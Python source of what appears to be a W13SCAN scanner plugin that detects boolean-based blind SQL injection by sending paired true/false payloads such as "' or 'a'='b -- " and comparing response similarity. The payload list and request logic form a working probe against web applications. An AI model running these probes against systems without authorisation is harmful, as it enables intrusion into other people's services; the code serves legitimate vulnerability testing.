#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/30 4:19 PM
# @Author  : w8ay
# @File    : sql_inject_bool.py
import copy
import difflib
import re

import requests

from lib.core.common import random_str, generateResponse, url_dict2str
from lib.core.enums import PLACE, VulType, HTTPMETHOD
from lib.core.plugins import PluginBase
from lib.helper.diifpage import findDynamicContent, getFilteredPageContent


class W13SCAN(PluginBase):
    name = '基于布尔or判断的SQL注入'

    def __init__(self):
        super().__init__()
        self.seqMatcher = difflib.SequenceMatcher(None)
        self.UPPER_RATIO_BOUND = 0.96
        self.LOWER_RATIO_BOUND = 0.02

        self.DIFF_TOLERANCE = 0.05
        self.DIFFT_TOLERANCE = 0.5
        self.CONSTANT_RATIO = 0.9

        self.retry = 6  # 重试次数
        self.dynamic = []

    def findDynamicContent(self, firstPage, secondPage):
        ret = findDynamicContent(firstPage, secondPage)
        if ret:
            self.dynamic.extend(ret)

    def removeDynamicContent(self, page):
        """
        Removing dynamic content from supplied page basing removal on
        precalculated dynamic markings
        """

        if page:
            for item in self.dynamic:
                prefix, suffix = item
                if prefix is None and suffix is None:
                    continue
                elif prefix is None:
                    page = re.sub(r"(?s)^.+%s" % re.escape(suffix), suffix.replace('\\', r'\\'), page)
                elif suffix is None:
                    page = re.sub(r"(?s)%s.+$" % re.escape(prefix), prefix.replace('\\', r'\\'), page)
                else:
                    page = re.sub(r"(?s)%s.+%s" % (re.escape(prefix), re.escape(suffix)),
                                  "%s%s" % (prefix.replace('\\', r'\\'), suffix.replace('\\', r'\\')), page)

        return page

    def inject(self, params, positon, k, payload_false, payload_true):
        data = copy.deepcopy(params)
        is_inject = False

        rr = self.req(positon, url_dict2str(data,positon))
        self.resp_str = self.removeDynamicContent(rr.text)

        data[k] = payload_false
        r2 = self.req(positon, url_dict2str(data,positon))
        falsePage = self.removeDynamicContent(r2.text)

        try:
            self.seqMatcher.set_seq1(self.resp_str)
            self.seqMatcher.set_seq2(falsePage)
            ratio_false = round(self.seqMatcher.quick_ratio(), 3)
            if ratio_false < self.UPPER_RATIO_BOUND:
                return False
        except (MemoryError, OverflowError):
            return False

        # true page
        data[k] = payload_true
        r = self.req(positon, url_dict2str(data,positon))
        truePage = self.removeDynamicContent(r.text)

        if truePage == falsePage:
            return False

        try:
            self.seqMatcher.set_seq1(self.resp_str)
            self.seqMatcher.set_seq2(truePage)
            ratio_true = round(self.seqMatcher.quick_ratio(), 3)
        except (MemoryError, OverflowError):
            return False

        if ratio_false > self.UPPER_RATIO_BOUND:
            if abs(ratio_true - ratio_false) > self.DIFFT_TOLERANCE:
                is_inject = True
        if not is_inject and ratio_true > 0.68 and ratio_true > ratio_false:
            originalSet = set(getFilteredPageContent(self.resp_str, True, "\n").split("\n"))
            trueSet = set(getFilteredPageContent(truePage, True, "\n").split("\n"))
            falseSet = set(getFilteredPageContent(falsePage, True, "\n").split("\n"))

            if len(originalSet - trueSet) <= 2 and trueSet != falseSet:
                candidates = trueSet - falseSet
                if len(candidates) > 0:
                    is_inject = True
                # if candidates:
                #     candidates = sorted(candidates, key=len)
                #     for candidate in candidates:
                #         if re.match(r"\A[\w.,! ]+\Z",
                #                     candidate) and ' ' in candidate and candidate.strip() and len(
                #             candidate) > 10:
                #             is_inject = True
                #             break

        if is_inject:
            ret = []
            ret.append({
                "request": r.reqinfo,
                "response": generateResponse(r),
                "key": k,
                "payload": payload_true,
                "position": positon,
                "desc": "发送True请求包与原网页相似度:{}".format(ratio_true)
            })
            ret.append({
                "request": r2.reqinfo,
                "response": generateResponse(r2),
                "key": k,
                "payload": payload_false,
                "position": positon,
                "desc": "发送False请求包与原网页相似度:{}".format(ratio_false)
            })
            return ret
        else:
            return False

    def generatePayloads(self, payloadTemplate, v, is_num=False):
        '''
        根据payload模板生成布尔盲注所需要的True 和 False payload
        :param payloadTemplate:
        :return:
        '''
        if is_num:
            payload_true = "{}/0".format(v)
        else:
            str1 = random_str(2)
            str2 = random_str(2)
            while str1 == str2:
                str2 = random_str(2)
            payload_true = v + payloadTemplate.format(str1, str2)

        rand_str = random_str(2)
        if is_num:
            payload_false = "{}/1".format(v)
        else:
            payload_false = v + payloadTemplate.format(rand_str, rand_str)
        return payload_true, payload_false

    def audit(self):
        # return

        count = 0
        ratio = 0
        # 动态内容替换

        self.resp_str = self.response.text

        iterdatas = self.generateItemdatas()
        # 根据原始payload和位置组合新的payload
        for origin_dict, positon in iterdatas:
            if positon == PLACE.URI:
                continue

            sql_payload = [
                "<--isdigit-->",
                "' or '{0}'='{1}",
                "' or '{0}'='{1} -- ",
                "' or {0}={1} -- "
            ]


            for k, v in origin_dict.items():
                temp_sql_flag = sql_payload.copy()
                # test order by
                if "desc" in v or "asc" in v:
                    _sql_flag = ",if('{0}'='{1}',1,(select 1 from information_schema.tables))"
                    temp_sql_flag.append(_sql_flag)

                for payload in temp_sql_flag:
                    is_num = False
                    if payload == "<--isdigit-->":
                        if str(v).isdigit():
                            is_num = True
                        else:
                            continue
                    payload_true, payload_false = self.generatePayloads(payload, v, is_num)
                    ret1 = self.inject(origin_dict, positon, k, payload_true,payload_false)
                    if ret1:
                        payload_true, payload_false = self.generatePayloads(payload, v, is_num)
                        ret2 = self.inject(origin_dict, positon, k, payload_true,payload_false)
                        if ret2:
                            result = self.new_result()
                            result.init_info(self.requests.url, self.requests.params, "SQL注入", VulType.SQLI)
                            for values in ret1:
                                result.add_detail("第一次布尔验证", values["request"], values["response"],
                                                  values["desc"], values["key"], values["payload"],
                                                  values["position"])
                            for values in ret2:
                                result.add_detail("第二次布尔验证", values["request"], values["response"],
                                                  values["desc"], values["key"], values["payload"],
                                                  values["position"])
                            self.success(result)
                            return True
